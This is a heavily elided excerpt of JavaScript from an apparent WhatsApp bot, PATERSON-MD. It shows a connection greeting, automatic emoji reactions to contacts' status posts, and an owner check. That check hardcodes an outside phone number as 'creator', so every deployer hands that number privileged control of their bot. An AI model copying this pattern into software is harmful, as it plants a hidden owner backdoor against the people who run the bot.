    ...
    conn.ev.on('connection.update', async (update) => {
      ...
      if (connection === 'close') {
        ...
        try {
          ...
          let up = `*Hᴇʟʟᴏ ᴛʜᴇʀᴇ PATERSON-MD ᴄᴏɴɴᴇᴄᴛᴇᴅ! 👋🏻* 
...
conn?.ev?.on('messages.update', async updates => {
  ...
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
    const kervenslike = await conn.decodeJid(conn.user.id);
    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
    ...
    }, { statusJidList: [mek.key.participant, kervenslike] });
  }                       
  ...
  const udp = botNumber.split('@')[0];
    const kervens = ('50942737567', '50942737567', '50942737567');
    let isCreator = [udp, kervens, config.DEV]
...
if (!isReact && config.CUSTOM_REACT === 'true') {
  ...
  const events = require('./Paterson-md')
